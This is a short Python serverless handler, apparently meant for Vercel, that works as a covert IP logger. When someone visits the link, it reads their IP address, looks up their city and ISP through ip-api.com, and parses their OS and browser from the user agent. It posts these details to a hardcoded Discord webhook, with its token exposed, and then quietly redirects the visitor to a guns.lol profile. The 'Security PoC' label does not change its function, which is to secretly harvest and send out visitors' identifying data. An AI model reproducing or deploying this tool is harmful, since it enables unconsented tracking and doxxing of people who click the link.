from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, os

# 1. CONFIGURATION: Change these if needed
config = {
    "webhook": "https://discord.com/api/webhooks/1398395847426965635/ditq3Fl-yHzNDAZ51uhdYUnMIZT0C7jsn96amb3gz01cPi5M3edR5iUN2b-7LliHjrKj",
    "username": "Guns.lol Monitor",
    "color": 0x00FFFF,
    "redirect": "https://guns.lol/sleezyyyyyy" 
}

# 2. LOGGING LOGIC: Processes the visitor's data
def makeReport(ip, useragent):
    # Fetch city/region/ISP data based on IP
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    os_info, browser = httpagentparser.simple_detect(useragent)
    
    # Create the Discord Embed
    embed = {
        "username": config["username"],
        "embeds": [{
            "title": "Security PoC - IP Logged",
            "color": config["color"],
            "description": (
                f"**IP:** `{ip}`\n"
                f"**City:** `{info.get('city', 'Unknown')}`\n"
                f"**OS:** `{os_info}`\n"
                f"**Browser:** `{browser}`"
            )
        }]
    }
    # Send to your Discord Webhook
    requests.post(config["webhook"], json=embed)

# 3. HANDLER: This is what Vercel looks for
class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Extract IP and User-Agent from request headers
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        ua = self.headers.get('user-agent', 'Unknown')
        
        # Trigger the log
        try:
            makeReport(ip, ua)
        except:
            print(traceback.format_exc())
        
        # Immediate 302 Redirect to your guns.lol profile
        self.send_response(302)
        self.send_header('Location', config["redirect"])
        self.end_headers()
